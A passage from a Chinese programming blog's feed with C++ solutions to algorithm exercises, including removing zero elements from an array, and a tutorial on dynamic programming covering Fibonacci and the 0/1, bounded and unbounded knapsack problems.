class="keyword">int</span> j = <span class="number">1</span>; j &lt; c + <span class="number">1</span>; j++)</span><br><span class="line">            cin &gt;&gt; arr[i][j];</span><br><span class="line">        cin &gt;&gt; flag[i];  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">out</span>(player);</span><br><span class="line">    cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; str;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>10.删除数组中的0元素</h1><p><strong>题目描述</strong></p><p>编写函数CompactIntegers，删除数组中所有值为0的元素，其后元素向数组首端移动。注意，CompactIntegers函数需要接收数组及其元素个数作为参数，函数返回值应为删除操作执行后数组的新元素个数。输入时首先读入数组长度，再依次读入每个元素。将调用此函数后得到的数组和函数返回值输出。</p><p><strong>输入</strong></p><p>第一行一个数，表示数组个数</p><p>第二行为每个数字，空格分开</p><p><strong>输出</strong></p><p>输出处理后的数字以及个数，各占一行</p><p><strong>样例输入</strong></p><p><code>7  2 0 4 3 0 0 5</code></p><p><strong>样例输出</strong></p><p><code>2 4 3 5 4</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CompactIntegers</span><span class="params">(<span class="keyword">int</span> nums[],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i]!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            nums[index]=nums[i];    <span class="comment">//用index重新填充非零元素</span></span><br><span class="line">            index++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> index;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n; </span><br><span class="line">    <span class="keyword">int</span> nums[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> newNums=<span class="built_in">CompactIntegers</span>(nums,n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; newNums; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;nums[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl&lt;&lt;newNums&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;题目来源：&lt;a href=&quot;https://www.dotcpp.com/oj/problemset.php?page=3&amp;amp;mark=6&quot;&gt;蓝桥杯ACM训练系统&lt;/a&gt;&lt;br&gt;
题目编号1468~1479&lt;/p&gt;
&lt;/blockquote&gt;</summary>
      
    
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/categories/%E7%AE%97%E6%B3%95-C/"/>
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/tags/%E7%AE%97%E6%B3%95-C/"/>
    
  </entry>
  
  <entry>
    <title>动态规划算法总结</title>
    <link href="https://zss192.github.io/2021/03/30/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>https://zss192.github.io/2021/03/30/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-30T03:54:00.000Z</published>
    <updated>2021-03-30T03:54:56.627Z</updated>
    
    <content type="html"><![CDATA[<h1>思想</h1><p>名词解释：通过一个例子来解释</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">A : <span class="string">&quot;1+1+1+1+1+1+1+1 =？&quot;</span> </span><br><span class="line"></span><br><span class="line">A : <span class="string">&quot;上面等式的值是多少&quot;</span></span><br><span class="line">B : 计算 <span class="string">&quot;8!&quot;</span></span><br><span class="line"></span><br><span class="line">A : 在上面等式的左边写上 <span class="string">&quot;1+&quot;</span> </span><br><span class="line">A : <span class="string">&quot;此时等式的值为多少&quot;</span></span><br><span class="line">B :  <span class="string">&quot;9!&quot;</span>  (quickly)</span><br><span class="line">A : <span class="string">&quot;你怎么这么快就知道答案了&quot;</span></span><br><span class="line">A : <span class="string">&quot;只要在8的基础上加1就行了&quot;</span></span><br><span class="line">A : <span class="string">&quot;所以你不用重新计算因为你记住了第一个等式的值为8!动态规划算法也可以说是 &#x27;记住求过的解来节省时间&#x27;&quot;</span></span><br></pre></td></tr></table></figure><p>例如斐波拉契数列Fibonacci</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Fibonacci</span> (n) = <span class="number">1</span>;   n = <span class="number">0</span></span><br><span class="line"><span class="built_in">Fibonacci</span> (n) = <span class="number">1</span>;   n = <span class="number">1</span></span><br><span class="line"><span class="built_in">Fibonacci</span> (n) = <span class="built_in">Fibonacci</span>(n<span class="number">-1</span>) + <span class="built_in">Fibonacci</span>(n<span class="number">-2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> <span class="built_in">fib</span>(<span class="keyword">int</span> n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fib</span>(n<span class="number">-1</span>)+<span class="built_in">fib</span>(n<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是常用的递归法，但是我们发现很多fib()会重复执行，而我们可以算出来一个fib()后把它存到一个数组中再次用到的时候直接根据数组取值，这就是动态规划</p><h1>经典例题</h1><h2 id="🚩1-01背包问题（物品个数为1）"><a class="header-anchor" href="#🚩1-01背包问题（物品个数为1）">¶</a>🚩1. 01背包问题（物品个数为1）</h2><p>有N个物品，其重量分别为weight[i]，其价值分别为value[i]，现有一个容量为V的背包，问怎样装商品才能使得背包中的价值最大？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> N=<span class="number">5</span>,V=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> weight[]=&#123;<span class="number">0</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">6</span>&#125;;   <span class="comment">//方便统计从1开始</span></span><br><span class="line"><span class="keyword">int</span> value[]=&#123;<span class="number">0</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">10</span>&#125;;</span><br></pre></td></tr></table></figure><p>可先看B站这个视频讲解：<a href="https://www.bilibili.com/video/BV1K4411X766/">https://www.bilibili.com/video/BV1K4411X766/</a></p><p>其实就是相当于我们创建一个表格即dp[][]，左边那一列表示商品编号，上面那一行表示背包容量，表格内容是此时状态的最大价值</p><p>先看结果，如下</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210330112048755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>解释：</p><p>一行一行的填写，从上至下从左至右。如编号1重量为3，那么容量为0、1、2时都不能放下，最大价值都为0</p><p>当背包重量为3时可以放下商品1所以最大价值为4</p><p>再考虑第二行，j等于0<sub>2时都放不下最大价值为0，由于商品2重量为6，那么背包容量为3</sub>5时都放不下商品2只能放商品1最大价值为商品1的价值4。</p><p>而当背包容量为6时，此时能够放下商品2，那么就要考虑要不要放商品2</p><p>1️⃣放商品2，那么最大价值就是此时背包的容量减去商品2的重量为0，再看第一行重量为0时的价值也是0，那么最大价值为6</p><p>2️⃣不放商品2，那么最大价值就是第一行背包容量为6时的最大价值为4</p><p>放商品2最大价值为6，不放最大价值为4，我们选最大值为6</p><p>总结如下：</p><p>若背包容量小于商品n的重量放不下商品</p><ul><li>那么前n个商品的最大价值和前n-1个商品的最大价值是一样的（既然不放相当于就不考虑这个商品，那么考虑前n个商品其实就是考虑前n-1个商品）</li></ul><p>若此时背包装得下商品n</p><ul><li>若选择放商品n，那么背包可用容量KV就等于背包总容量SV减去商品n的重量nV，那么问题就变成了只考虑前n-1个商品且背包容量为KV时的最大价值，而此前我们已经求得了这个值填写在了表中所以直接用这个值加上商品n的价值就是最大价值</li><li>若不放商品n，那么前n个商品的最大价值和前n-1个商品的最大价值是一样的</li><li>从以上两个选择选一个最大的就是最终的最大价值</li></ul><p>对应的代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">1</span>; n &lt;= N; n++)<span class="comment">//遍历商品1~N</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> v = <span class="number">0</span>; v &lt;= V; v++)<span class="comment">//遍历容量0~V</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(v&gt;=weight[n])<span class="comment">//背包容量大于等于商品n的容量时</span></span><br><span class="line">&#123;</span><br><span class="line">dp[n][v]=<span class="built_in">max</span>(dp[n<span class="number">-1</span>][v-weight[n]]+value[n],dp[n<span class="number">-1</span>][v]); <span class="comment">//选择放商品n和不放商品n哪个价值最大</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//背包容量小于商品n的容量时</span></span><br><span class="line">&#123;</span><br><span class="line">dp[n][v]=dp[n<span class="number">-1</span>][v];<span class="comment">//此时商品n一定不能放，此时最大价值就是商品1到i-1中，容量为v时的最大价值</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而其实我们也可以用一维数组优化下代码，代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> n=<span class="number">1</span>;n&lt;=N;n++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> v=V;v&gt;=w[i];v--)</span><br><span class="line">dp[v]=<span class="built_in">max</span>(dp[v],dp[v-weight[n]]+value[n]);</span><br></pre></td></tr></table></figure><p>而我们怎么知道求得的最大价值其中我们选了哪些商品呢</p><p>其实就是从表的右下角开始回溯，如果dp[n][j]和dp[n-1][j]值是一样的，那么我们肯定没装商品n(相当于我们就没考虑商品n)。事实上，我们推dp[n][j]时如果选择不放商品n那么我们就让dp[n][j]=dp[n-1][j]</p><p>所以相当于我们根据两个数值是否相等来判断当时我们是否选了商品n</p><p>相当于是求最大价值的一个逆过程</p><p>如果装了商品n，那么用总容量减去商品n的容量得到可用容量kV再来判断是否放了商品n-1，其实也就是看dp[n-1][kv]和dp[n-2][kv]是否相等，以此类推</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> n=N,v=V;</span><br><span class="line"><span class="keyword">while</span>(n!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(dp[n][v]==dp[n<span class="number">-1</span>][v])</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;商品&quot;</span>&lt;&lt;n&lt;&lt;<span class="string">&quot;未被选中&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;商品&quot;</span>&lt;&lt;n&lt;&lt;<span class="string">&quot;被选中&quot;</span>&lt;&lt;endl;</span><br><span class="line">v=v-weight[n];</span><br><span class="line">&#125;</span><br><span class="line">n--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>🦄完整代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">15</span>][<span class="number">15</span>];</span><br><span class="line"><span class="keyword">int</span> N=<span class="number">5</span>,V=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> weight[]=&#123;<span class="number">0</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">6</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> value[]=&#123;<span class="number">0</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">10</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印初始状态</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printInit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;共&quot;</span>&lt;&lt;N&lt;&lt;<span class="string">&quot;个商品，&quot;</span>&lt;&lt;<span class="string">&quot;背包容量为&quot;</span>&lt;&lt;V&lt;&lt;endl;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= N; i++)</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;商品&quot;</span>&lt;&lt;i&lt;&lt;<span class="string">&quot;的重量为&quot;</span>&lt;&lt;weight[i]&lt;&lt;<span class="string">&quot;，价值为&quot;</span>&lt;&lt;value[i]&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//求最大价值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxValue</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">1</span>; n &lt;= N; n++)<span class="comment">//遍历商品1~N</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> v = <span class="number">0</span>; v &lt;= V; v++)<span class="comment">//遍历容量0~V</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(v&gt;=weight[n])<span class="comment">//背包容量大于等于商品n的容量时</span></span><br><span class="line">&#123;</span><br><span class="line">dp[n][v]=<span class="built_in">max</span>(dp[n<span class="number">-1</span>][v-weight[n]]+value[n],dp[n<span class="number">-1</span>][v]); <span class="comment">//选择放商品n和不放商品n哪个价值最大</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//背包容量小于商品i的容量时</span></span><br><span class="line">&#123;</span><br><span class="line">dp[n][v]=dp[n<span class="number">-1</span>][v];<span class="comment">//此时商品n一定不能放，此时最大价值就是商品1到n-1中，容量为v时的最大价值</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dp[N][V];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印最大价值的商品选择情况</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printSelect</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n=N,v=V;</span><br><span class="line"><span class="keyword">while</span>(n!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(dp[n][v]==dp[n<span class="number">-1</span>][v])</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;商品&quot;</span>&lt;&lt;n&lt;&lt;<span class="string">&quot;未被选中&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;商品&quot;</span>&lt;&lt;n&lt;&lt;<span class="string">&quot;被选中&quot;</span>&lt;&lt;endl;</span><br><span class="line">v=v-weight[n];</span><br><span class="line">&#125;</span><br><span class="line">n--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printInit</span>();</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;最大价值为：&quot;</span>&lt;&lt;<span class="built_in">maxValue</span>()&lt;&lt;endl;</span><br><span class="line"><span class="built_in">printSelect</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="🚩2-多重背包问题（物品个数有限）"><a class="header-anchor" href="#🚩2-多重背包问题（物品个数有限）">¶</a>🚩2.多重背包问题（物品个数有限）</h2><p>在01背包的基础上每个商品可以有多个</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">21</span>][<span class="number">21</span>];</span><br><span class="line"><span class="keyword">int</span> value[]=&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> weight[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> number[]=&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>&#125;;<span class="comment">//每个商品的个数</span></span><br><span class="line"><span class="keyword">int</span> N=<span class="number">5</span>,V=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= N; i++)<span class="comment">//对于每个物品</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= V; j++)<span class="comment">//对于每个容量</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= number[i]; k++)<span class="comment">//放几个</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(j&gt;=weight[i]*k)</span><br><span class="line">&#123;</span><br><span class="line">dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j-weight[i]*k]+value[i]*k , dp[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;dp[N][V]&lt;&lt;endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="🚩3-完全背包问题（物品个数无限）"><a class="header-anchor" href="#🚩3-完全背包问题（物品个数无限）">¶</a>🚩3. 完全背包问题（物品个数无限）</h2><p>在01背包的基础上每个商品的数量是无限的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">21</span>][<span class="number">21</span>];</span><br><span class="line"><span class="keyword">int</span> value[]=&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> weight[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> N=<span class="number">5</span>,V=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= N; i++)<span class="comment">//对于每个商品</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= V; j++)<span class="comment">//对于背包容量</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(j&gt;=weight[i])</span><br><span class="line">&#123;</span><br><span class="line">dp[i][j]=<span class="built_in">max</span>(dp[i][j-weight[i]]+value[i],dp[i<span class="number">-1</span>][j]);   <span class="comment">//和01背包相比就这句不同</span></span><br><span class="line"><span class="comment">//dp[i][j]=max(dp[i-1][j-weight[i]]+value[i],dp[i-1][j]);    01背包</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">dp[i][j]=dp[i<span class="number">-1</span>][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout&lt;&lt;dp[N][V]&lt;&lt;endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;思想&lt;/h1&gt;
&lt;p&gt;名词解释：通过一个例子来解释&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span clas</summary>
      
    
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/categories/%E7%AE%97%E6%B3%95-C/"/>
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/tags/%E7%AE%97%E6%B3%95-C/"/>
    
  </entry>
  
  <entry>
    <title>蓝桥杯-完美的代价(C++详细解释版)</title>
    <link href="https://zss192.github.io/2021/03/29/%E8%93%9D%E6%A1%A5%E6%9D%AF-%E5%AE%8C%E7%BE%8E%E7%9A%84%E4%BB%A3%E4%BB%B7-C-%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A%E7%89%88/"/>
    <id>https://zss192.github.io/2021/03/29/%E8%93%9D%E6%A1%A5%E6%9D%AF-%E5%AE%8C%E7%BE%8E%E7%9A%84%E4%BB%A3%E4%BB%B7-C-%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A%E7%89%88/</id>
    <published>2021-03-29T03:53:00.000Z</published>
    <updated>2021-03-30T03:53:44.078Z</updated>
    
